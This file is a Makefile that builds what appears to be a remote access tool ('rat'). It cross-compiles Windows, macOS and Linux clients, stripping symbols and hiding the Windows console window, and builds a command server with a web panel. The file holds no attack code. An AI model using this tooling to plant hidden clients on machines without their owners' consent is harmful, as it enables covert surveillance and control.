BUILD=go build
PROD=go build -ldflags="-w -s" --tags="prod"
PROD_WIN32=go build -ldflags="-w -s -H windowsgui" --tags="prod"
LIB=command/web/static/lib.js

default: web
	cd client && $(BUILD) -o ../client.exe
	cd command && $(BUILD) -o ../command.exe

web:
	tsc

ugly: web
	uglifyjs --compress --mangle -o $(LIB) -- $(LIB)

cert:
	cd command && openssl genrsa -out private.key 1024
	cd command && openssl req -new -x509 -key private.key -out cert.pem -days 365

prod: web ugly
	cd command && $(PROD) -o ../rat

windows: prod
	cd client && GOOS=windows GOARCH=amd64 $(PROD_WIN32) -o ../command/bin/windows_amd64.exe
	cd client && GOOS=windows GOARCH=386 $(PROD_WIN32) -o ../command/bin/windows_x86.exe

macos: prod
	cd client && GOOS=darwin GOARCH=amd64 $(PROD) -o ../command/bin/macos_amd64

linux: prod
	cd client && GOOS=linux GOARCH=amd64 $(PROD) -o ../command/bin/linux_amd64
	cd client && GOOS=linux GOARCH=386 $(PROD) -o ../command/bin/linux_x86

fakebin:
	touch command/bin/windows_amd64.exe
	touch command/bin/windows_x86.exe
	touch command/bin/macos_amd64
	touch command/bin/linux_amd64
	touch command/bin/linux_x86

clean:
	cd client/screen/ && rm -f *.bmp *.jpg
	rm -f debug.bmp
	rm -f *.exe
	rm -f command/command client/client command/command.exe client/client.exe
	rm -f command/debug client/debug
	rm -f command/bin/*
	rm -f rat
	rm -f command/web/static/lib.js command/web/static/lib.js.map
